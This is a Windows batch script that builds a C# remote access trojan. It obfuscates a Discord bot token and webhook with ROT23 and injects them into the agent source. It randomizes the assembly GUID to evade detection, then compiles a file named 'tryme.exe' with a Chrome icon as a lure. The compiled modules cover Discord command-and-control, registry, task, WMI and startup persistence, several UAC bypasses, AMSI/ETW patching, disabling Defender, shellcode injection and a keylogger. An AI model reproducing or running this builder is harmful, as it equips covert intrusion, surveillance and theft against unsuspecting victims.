@echo off
setlocal enabledelayedexpansion

echo [*] RAT C# Builder
echo.

if "%1"=="" (
    echo Usage: build.bat ^<bot_token^> ^<guild_id^> ^<channel_id^> ^<webhook_url^>
    exit /b 1
)

set TOKEN=%1
set GUILD=%2
set CHANNEL=%3
set WEBHOOK=%4

echo [*] Applying ROT23 encoding to tokens...

echo import sys > _rot23.py
echo s = sys.argv[1] >> _rot23.py
echo r = ''.join(chr((ord(c)-97+23)%%%%26+97) if 'a'^<^=c^<='z' else chr((ord(c)-65+23)%%%%26+65) if 'A'^<^=c^<='Z' else c for c in s) >> _rot23.py
echo open('_out.txt','w').write(r) >> _rot23.py

python _rot23.py "%TOKEN%" 2>nul
set TOKEN_ENC=
if exist _out.txt (
    set /p TOKEN_ENC=<_out.txt
    del _out.txt 2>nul
)

if "%TOKEN_ENC%"=="" (
    echo [-] Python unavailable, using PowerShell...
    powershell -Command "$s='%TOKEN%'; $r=''; foreach($c in $s.ToCharArray()){if($c -ge 'a' -and $c -le 'z'){$r+=[char](($c-[char]'a'+23)%%26+[char]'a')}elseif($c -ge 'A' -and $c -le 'Z'){$r+=[char](($c-[char]'A'+23)%%26+[char]'A')}else{$r+=$c}}; Write-Output $r" > _token_enc2.txt
    set /p TOKEN_ENC=<_token_enc2.txt
    del _token_enc2.txt 2>nul
)

python _rot23.py "%WEBHOOK%" 2>nul
set WEBHOOK_ENC=
if exist _out.txt (
    set /p WEBHOOK_ENC=<_out.txt
    del _out.txt 2>nul
)

if "%WEBHOOK_ENC%"=="" (
    powershell -Command "$s='%WEBHOOK%'; $r=''; foreach($c in $s.ToCharArray()){if($c -ge 'a' -and $c -le 'z'){$r+=[char](($c-[char]'a'+23)%%26+[char]'a')}elseif($c -ge 'A' -and $c -le 'Z'){$r+=[char](($c-[char]'A'+23)%%26+[char]'A')}else{$r+=$c}}; Write-Output $r" > _webhook_enc2.txt
    set /p WEBHOOK_ENC=<_webhook_enc2.txt
    del _webhook_enc2.txt 2>nul
)

del _rot23.py 2>nul

if "%TOKEN_ENC%"=="" (
    echo [-] Failed to encode token
    exit /b 1
)
if "%WEBHOOK_ENC%"=="" (
    echo [-] Failed to encode webhook
    exit /b 1
)

echo [*] Writing config to Program.cs...
powershell -Command "& {$c = Get-Content '..\agent\Program.cs' -Raw; $c = $c.Replace('REPLACE_TOKEN_AT_BUILD', '%TOKEN_ENC%'); $c = $c.Replace('REPLACE_GUILD_AT_BUILD', '%GUILD%'); $c = $c.Replace('REPLACE_CHANNEL_AT_BUILD', '%CHANNEL%'); $c = $c.Replace('REPLACE_WEBHOOK_AT_BUILD', '%WEBHOOK_ENC%'); Set-Content '..\agent\Program.cs' -Value $c}"

echo [*] Embedding webhook into WebhookLogger.cs...
powershell -Command "& {$c = Get-Content '..\agent\C2\WebhookLogger.cs' -Raw; $c = $c.Replace('REPLACE_WEBHOOK_AT_BUILD', '%WEBHOOK%'); Set-Content '..\agent\C2\WebhookLogger.cs' -Value $c}"

echo [*] Generating random assembly GUID...
for /f "delims=" %%i in ('powershell -Command "[guid]::NewGuid().ToString()"') do set RANDOM_GUID=%%i
powershell -Command "& {$c = Get-Content '..\agent\Properties\AssemblyInfo.cs' -Raw; $c = $c.Replace('a1b2c3d4-e5f6-7890-abcd-ef1234567890', '%RANDOM_GUID%'); Set-Content '..\agent\Properties\AssemblyInfo.cs' -Value $c}"

echo [*] Compiling with csc.exe...
set CSC="%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist %CSC% set CSC="%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"
if not exist %CSC% (
    echo [-] .NET 4.8 compiler not found!
    exit /b 1
)

%CSC% /target:winexe /optimize+ /out:tryme.exe ^
    /reference:System.Net.Http.dll,System.Management.dll,System.Drawing.dll,System.Windows.Forms.dll ^
    /win32icon:..\resources\chrome.ico ^
    ..\agent\Program.cs ^
    ..\agent\C2\DiscordGateway.cs ^
    ..\agent\C2\WebhookLogger.cs ^
    ..\agent\C2\CommandHandler.cs ^
    ..\agent\Persistence\RegistryRun.cs ^
    ..\agent\Persistence\ScheduledTask.cs ^
    ..\agent\Persistence\WmiSubscription.cs ^
    ..\agent\Persistence\StartupFolder.cs ^
    ..\agent\Uac\Fodhelper.cs ^
    ..\agent\Uac\SilentCleanup.cs ^
    ..\agent\Uac\Cmstp.cs ^
    ..\agent\Uac\EventViewer.cs ^
    ..\agent\Uac\ComBypass.cs ^
    ..\agent\Uac\UacChain.cs ^
    ..\agent\Evasion\AmsiPatch.cs ^
    ..\agent\Evasion\EtwPatch.cs ^
    ..\agent\Evasion\SandboxCheck.cs ^
    ..\agent\Evasion\DefenderDisable.cs ^
    ..\agent\Inject\ShellcodeRunner.cs ^
    ..\agent\Payloads\Recon.cs ^
    ..\agent\Payloads\Keylogger.cs ^
    ..\agent\Properties\AssemblyInfo.cs

if %ERRORLEVEL% NEQ 0 (
    echo [-] Compilation failed!
    exit /b 1
)

echo [+] Compilation successful: tryme.exe
echo.

rem Restore source files
git checkout -- ..\agent\Program.cs ..\agent\C2\WebhookLogger.cs ..\agent\Properties\AssemblyInfo.cs 2>nul
